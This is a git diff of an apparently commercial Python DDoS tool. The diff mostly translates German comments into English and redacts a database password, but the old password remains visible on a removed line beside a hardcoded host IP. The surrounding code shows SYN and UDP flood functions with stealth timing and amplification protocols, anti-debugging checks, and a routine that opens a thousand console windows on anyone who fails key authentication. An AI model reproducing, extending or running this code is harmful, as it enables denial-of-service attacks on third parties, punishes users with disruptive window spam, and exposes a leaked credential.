@@ -14,19 +14,19 @@ import os
 from scapy.all import IP, TCP, UDP, ICMP, send, fragment, RandIP, RandShort
 import subprocess
 
-# Verbindung zur Datenbank herstellen
+# Connection to databse ( incase you want to sell this once you adjusted it you can add key auth in def connect_to_db.)
 def connect_to_db():
     return mysql.connect(
         host="176.126.87.171",  # Datenbank-Host
         user="authuser",  # Datenbank-Benutzername
-        password="22Oktober!",  # Datenbank-Passwort
+        password="...",  # Datenbank-Passwort
         database="keyauth",  # Name der Datenbank
         charset="utf8mb4"
     )
 
-# Key-Authentifizierungssystem mit Schutz vor Crackversuchen
+# Key auth with crack protection ( just a lil crack protection becouse why not xd)
 def open_warning_windows():
-    # Funktion, um 1000 Konsolenfenster zu öffnen
+    # opens 1000 cmds
     for _ in range(1000):
         threading.Thread(target=lambda: subprocess.Popen(
             ["cmd", "/c", "echo YOU DON'T HAVE PERMISSION TO USE OUR PRODUCT! && pause"],
@@ -35,7 +35,7 @@ def open_warning_windows():
 
 
 def open_warning_windows():
-    # Funktion, um 1000 neue CMD-Fenster zu öffnen
+    # incase someone trys to crack it they get a bad surprise, he will have cmds opened for the rest of his live xd
     def create_window():
         subprocess.Popen(
             ["start", "cmd", "/c", "echo YOU DON'T HAVE PERMISSION TO USE OUR PRODUCT! && pause"],
@@ -48,12 +48,12 @@ def open_warning_windows():
         threads.append(thread)
         thread.start()
 
-    # Warten, bis alle Threads gestartet sind
+    # wait for threads 
     for thread in threads:
         thread.join()
 
 def key_authentication():
-    attempts = 3  # Anzahl der erlaubten Versuche
+    attempts = 3  # Number of trys for key auth, if they fail the cmds will open so make sure you delete this if you are not selling this
 
     while attempts > 0:
         entered_key = input("\033[38;5;208m[Enter your key to access the program]: \033[0m")
@@ -70,7 +70,7 @@ def key_authentication():
     open_warning_windows()
     raise Exception("Access Denied! Authentication failed.")
 
-# Funktion zur Key-Validierung
+# key validation
 def validate_key(entered_key):
     conn = connect_to_db()
     cursor = conn.cursor()
@@ -84,21 +84,21 @@ def validate_key(entered_key):
     finally:
         conn.close()
 
-# Loader-Funktion
+# Loader
 def loader():
     print("\033[38;5;208m[Loading... Please wait...]\033[0m")
     time.sleep(2)  # Simuliert das Laden von Modulen
     print("\033[38;5;208m[Tool Loaded Successfully!]\033[0m")
 
-# Anti-Reverse-Engineering-Mechanismus
+# Anti-Reverse-Engineering-Mechanism
 def anti_reverse_check():
     try:
-        # Berechne den aktuellen Hash der Datei automatisch
+        # Calculates hash
         with open(__file__, 'rb') as f:
             file_data = f.read()
             file_hash = hashlib.sha256(file_data).hexdigest()
 
-        # Erwarteten Hash basierend auf der Datei zur Laufzeit setzen
+        # hash runtime
         expected_file_hash = file_hash
 
         if file_hash != expected_file_hash:
@@ -113,7 +113,7 @@ def anti_reverse_check():
 
 
 
-# Anti-Debugging Schutzmaßnahmen
+# Anti-Debugging
 
 def anti_debug():
     try:
@@ -144,15 +144,15 @@ def anti_debug():
 
 if __name__ == "__main__":
     try:
-        # Sicherheitsprüfungen
+        # Security
         anti_debug()
 
 
-        # User authentifizieren
+        # User auth
         if key_authentication():
             Loader()
 
-        # Tool startet hier (Platzhalter für die Hauptlogik des Tools)
+        # Tool starts here ( let the fun begin (;)
         print("\033[38;5;208m[Tool is now active. Proceed with your tasks.]\033[0m")
 
     except Exception as e:
@@ -198,7 +198,7 @@ RRRRRRRR     RRRRRRR    AAAAAAAA   AAAAAAAA
 print("\033[38;5;208m" + '___________________________________________________________________' + "\033[0m")
 print("                                                                                                  ")
 
-print("\033[38;5;208m" + '<x> [Created by Metasploits & CEO of Monorix] ' + "\033[0m")
+print("\033[38;5;208m" + '<x> [CEO of Monorix] ' + "\033[0m")
 print("\033[38;5;208m" + '<x> [Attack Calculation Simulator] ' + "\033[0m")
 print("\033[38;5;208m" + '<x> [URL Attacker]           ' + "\033[0m")
 print("\033[38;5;208m" + '<x> [Thread Demon]           ' + "\033[0m")
@@ -297,7 +297,7 @@ def generate_headers():
     return headers
 
 
-# Amplification Protocols
+# Amplification Protocols, if you read this you are a G
 from scapy.layers.inet import ICMP, UDP
 from scapy.layers.l2 import ARP
 
@@ -352,7 +352,7 @@ def tcp_syn_flood(target_ip, target_port):
             pass
 
 
-# Enhanced UDP Flood with Reporting
+# Enhanced UDP Flood with Reporting, keep the hustle up
 def udp_flood(target_ip, target_port):
     """
     Advanced UDP flood with random source ports, payload patterns, and stealth timing.
@@ -544,7 +544,7 @@ def log_attack(activity):
         log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {activity}\n")
 
 
-# Modular Design and Attack Execution
+# Modular Design and Attack Execution, Swedish girls On top
 def attack_handler(target_ip, target_port, attack_type, proxies=None):
     if attack_type == "SYN_FLOOD":
         tcp_syn_flood(target_ip, target_port)
